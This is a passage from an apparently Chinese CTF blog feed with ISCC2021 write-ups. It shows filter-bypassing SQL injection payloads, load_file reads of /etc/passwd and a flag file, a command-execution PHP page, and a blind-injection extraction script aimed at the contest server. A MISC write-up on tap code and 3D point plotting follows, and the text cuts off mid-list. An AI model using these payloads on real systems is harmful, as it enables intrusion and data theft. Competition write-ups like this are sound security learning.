class="hljs-string">#Your Login name:iscc_web</span><br><span class="hljs-string">#Your Password:5.7.33-0ubuntu0.16.04.1</span><br></code></pre></td></tr></table></figure><p>发现当前数据库版本为5.7.33</p><p>接下来就是爆表名</p><p>from、information_schema都被过滤了，FROM大写绕过，关于绕过information_schema参考<a href="https://blog.csdn.net/m0_49835838/article/details/109159839">mysql注入绕过information_schema过滤</a>。</p><p>当前数据库版本为5.7，可用<code>sys.schema_auto_increment_columns</code>代替<code>information_schema</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Paylaod: ?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,(selselectect%0dgroup_concat(table_name)%0dFrom%0dsys.schema_auto_increment_columns),3%0d%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:iscc_flag</span><br><span class="hljs-string">#Your Password:3</span><br></code></pre></td></tr></table></figure><p>猜测列名为flag,爆值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Paylaod: ?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,(selselectect%0dflag%0dFROM%0discc_flag),3%0d%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:cccmd.php</span><br><span class="hljs-string">#Your Password:3</span><br></code></pre></td></tr></table></figure><p>访问cccmd.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[zxcvbMnlkjhgfsaoiuytreq]+|[ZXCVBNLKKJHGFSAOIUYTREQ]+|[0123456789]+|\(|\/|\*|\-|\+|\.|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\?|\&gt;|\&lt;|\,|\)|\(|\&amp;|\^|\%|\#|\@|\!/&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>       <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;die!!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$c</span>`;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!--flllllllllaaag.php--&gt;<br></code></pre></td></tr></table></figure><p>显然flag在flllllllllaaag.php中，首先要知道当前路径，执行pwd，得到当前绝对路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/cccmd.php?c=<span class="hljs-built_in">pwd</span><br><span class="hljs-comment">#/var/www/const</span><br></code></pre></td></tr></table></figure><p>load_file函数没有被过滤，尝试读取<code>/etc/passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0duniunionon%0dselselectect%0d1,(load_file(&#x27;</span>/etc/passwd<span class="hljs-string">&#x27;)),3%23</span><br></code></pre></td></tr></table></figure><p>成功读取<br><img src="https://img-blog.csdnimg.cn/20210519171130283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>路径知道了，接下来直接读取flllllllllaaag.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0duniunionon%0dselselectect%0d1,(load_file(&#x27;</span>/var/www/const/flllllllllaaag.php<span class="hljs-string">&#x27;)),3%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#F12查看源码得到&lt;?php$flag=&quot;iscc&#123;eeeeeasy_web!!666666&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>贴一下<a href="https://www.cnblogs.com/w0s1np/p/14782626.html">大师傅</a>的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://39.96.91.106:5001/?id=&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">True</span>):<br>    i = i + <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br><br>    <span class="hljs-keyword">while</span> (head &lt; tail):<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br><br>        payload = <span class="hljs-string">&quot;0%27||if(ascii(substr((seselectlect%0dhex(load_file(0x2f7661722f7777772f636f6e73742f666c6c6c6c6c6c6c6c6c616161672e706870))),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        r = requests.get(url + payload)<br>        r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>        <span class="hljs-comment"># print(url+payload)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your Login name&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            head = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># print(r.text)</span><br>            tail = mid<br><br>    last = result<br><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    print(result)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">3C3F7068700D0A24666C61673D22697363637B65656565656173795F77656221213636363636367D223B0D0A3F3E<br></code></pre></td></tr></table></figure><p>然后hex转字符串即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">m=<span class="hljs-string">&quot;3C3F7068700D0A24666C61673D22697363637B65656565656173795F77656221213636363636367D223B0D0A3F3E&quot;</span><br>s=<span class="hljs-built_in">bytes</span>.fromhex(m)<br>print(s)<br><br><span class="hljs-comment">#b&#x27;&lt;?php\r\n$flag=&quot;iscc&#123;eeeeeasy_web!!666666&#125;&quot;;\r\n?&gt;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html"> &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;练武&quot;&gt;&lt;a href=&quot;#练武&quot; class=&quot;headerlink&quot; title=&quot;练武&quot;&gt;&lt;/a&gt;练武&lt;/h1&gt;&lt;h2 id=&quot;ISCC客服冲冲冲（一）&quot;&gt;&lt;a href=&quot;#ISCC客服冲冲冲（一）&quot; class=&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="比赛复现" scheme="http://atkx.top/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="http://atkx.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2021 MISC WP</title>
    <link href="http://atkx.top/2021/05/26/ISCC2021-MISC-WP/"/>
    <id>http://atkx.top/2021/05/26/ISCC2021-MISC-WP/</id>
    <published>2021-05-25T16:06:53.000Z</published>
    <updated>2021-05-28T10:30:03.359Z</updated>
    
    <content type="html"><![CDATA[ <a id="more"></a><h2 id="练武"><a href="#练武" class="headerlink" title="练武"></a>练武</h2><h3 id="李华的红包"><a href="#李华的红包" class="headerlink" title="李华的红包"></a>李华的红包</h3><blockquote><p>题目描述：<br>大年初一，李华给爸爸拜年，从事计算机行业的父亲发给李华一张图片和一张银行卡。父亲告诉李华密码就藏在图片中，但是李华打开图片后却百思不得其解。你能帮助李华拿到密码吗？</p></blockquote><p>下载附件，<br><img src="https://img-blog.csdnimg.cn/20210517174752113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接binwalk分离得到hongbao.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">24</span>,<span class="hljs-number">43</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">21</span>,<span class="hljs-number">43</span><br></code></pre></td></tr></table></figure><p>没啥思路，看起来图片不完全，修改图片高度，图片下面有一个鼓，联想到敲击码<br><img src="https://img-blog.csdnimg.cn/20210517175032487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对照敲击码表<br><img src="https://img-blog.csdnimg.cn/20210517175209329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>转换得到<code>ISCCBFS</code>，有点坑，说是银行卡密码，其实并不是六位数字，最终flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCC&#123;ISCCBFS&#125;<br></code></pre></td></tr></table></figure><h3 id="Retrieve-the-passcode"><a href="#Retrieve-the-passcode" class="headerlink" title="Retrieve the passcode"></a>Retrieve the passcode</h3><blockquote><p>题目描述：<br>Scatter说他能解开这个古怪的密码，你呢？来试试吧！ Flag格式：ISCC{XXX}，XXX为小写字符串，不包括空格</p></blockquote><p>xyz.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>百度找到的脚本，修改一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> mpl_toolkits.mplot3d <span class="hljs-keyword">import</span> Axes3D<br><br>fig = plt.figure()<br>ax = fig.gca(projection=<span class="hljs-string">&quot;3d&quot;</span>)<br><br><br>xs, ys ,zs= np.loadtxt(<span class="hljs-string">&#x27;xyz.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27;:&#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>ax.scatter(xs, ys, zs, zdir=<span class="hljs-string">&quot;z&quot;</span>, c=<span class="hljs-string">&quot;#FF5511&quot;</span>, marker=<span class="hljs-string">&quot;o&quot;</span>, s=<span class="hljs-number">40</span>)<br>ax.<span class="hljs-built_in">set</span>(xlabel=<span class="hljs-string">&quot;X&quot;</span>, ylabel=<span class="hljs-string">&quot;Y&quot;</span>, zlabel=<span class="hljs-string">&quot;Z&quot;</span>)<br><br>plt.show()<br></code></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/20210519181216709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>脚本2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> mpl_toolkits.mplot3d <span class="hljs-keyword">import</span> Axes3D<br>dot1 = [[<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], 